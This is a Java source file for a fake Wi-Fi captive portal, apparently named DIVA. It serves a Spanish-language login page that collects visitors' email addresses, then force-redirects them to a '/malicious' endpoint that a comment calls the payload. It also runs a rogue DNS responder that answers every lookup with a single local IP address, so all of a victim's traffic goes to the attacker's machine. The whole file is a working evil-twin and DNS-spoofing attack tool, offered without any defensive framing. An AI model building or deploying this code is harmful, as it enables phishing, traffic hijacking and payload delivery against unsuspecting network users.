package com.diva.diva;

import com.sun.net.httpserver.*;
import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;

public class PortalCautivo implements HttpHandler {

    @Override
    public void handle(HttpExchange ex) throws IOException {
        if ("POST".equalsIgnoreCase(ex.getRequestMethod())) {
            String data = new String(ex.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
            String rawEmail = data.replaceAll(".*email=([^&]*).*", "$1");
            String correo = URLDecoder.decode(rawEmail, StandardCharsets.UTF_8);

            System.out.println("Correo recibido: " + correo);
            Correo.enviarConfirmacionAsync(correo);

            // REDIRECCIÓN 302 OBLIGATORIA AL PAYLOAD
            ex.getResponseHeaders().set("Location", "/malicious");
            ex.sendResponseHeaders(302, -1);
        } else {
            boolean ver = ex.getRequestURI().getQuery() != null && ex.getRequestURI().getQuery().contains("ver=terminos");
            
            String html = """
                <!DOCTYPE html>
                <html lang="es">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>DIVA - Acceso</title>
                    <style>
                        body { font-family: Arial, sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
                        .container { background: #fff; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
                        input[type="email"] { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
                        button { background: #007bff; color: #fff; padding: 12px 20px; border: none; border-radius: 5px; cursor: pointer; width: 100%; font-size: 16px; margin-top: 10px; }
                        button:hover { background: #0056b3; }
                        .terms { font-size: 12px; color: #666; margin: 15px 0; text-align: left; }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h2>Conéctate a DIVA</h2>
                        <form method="POST">
                            <input type="email" name="email" placeholder="Correo electrónico" required>
                            <div class="terms">
                                <label><input type="checkbox" required> Acepto términos y condiciones</label>
                                """ + (ver ? "<br>Aceptas compartir tu correo para conectar a la red." : "") + """
                            </div>
                            <button type="submit">Ingresar</button>
                        </form>
                    </div>
                </body>
                </html>
                """;
            responder(ex, html);
        }
    }

    private void responder(HttpExchange ex, String body) throws IOException {
        byte[] b = body.getBytes(StandardCharsets.UTF_8);
        ex.getResponseHeaders().set("Content-Type", "text/html; charset=UTF-8");
        ex.sendResponseHeaders(200, b.length);
        try (OutputStream os = ex.getResponseBody()) { os.write(b); }
    }

    public static void registrar(HttpServer s) {
        s.createContext("/", new PortalCautivo());
        new Thread(() -> {
            try (DatagramSocket socket = new DatagramSocket(53)) {
                byte[] buf = new byte[512];
                byte[] ip = InetAddress.getByName("192.168.137.1").getAddress();
                while (true) {
                    DatagramPacket p = new DatagramPacket(buf, buf.length);
                    socket.receive(p);
                    byte[] d = p.getData(), r = new byte[p.getLength() + 16];
                    System.arraycopy(d, 0, r, 0, 2);
                    r[2] = (byte) 0x81; r[3] = (byte) 0x80;
                    System.arraycopy(d, 4, r, 4, 2); r[7] = 0x01;
                    System.arraycopy(d, 12, r, 12, p.getLength() - 12);
                    int off = p.getLength();
                    byte[] ans = {(byte) 0xC0, 0x0C, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, (byte) 0x3C, 0x00, 0x04};
                    System.arraycopy(ans, 0, r, off, ans.length);
                    System.arraycopy(ip, 0, r, off + ans.length, 4);
                    socket.send(new DatagramPacket(r, r.length, p.getAddress(), p.getPort()));
                }
            } catch (Exception ignored) {}
        }).start();
    }
}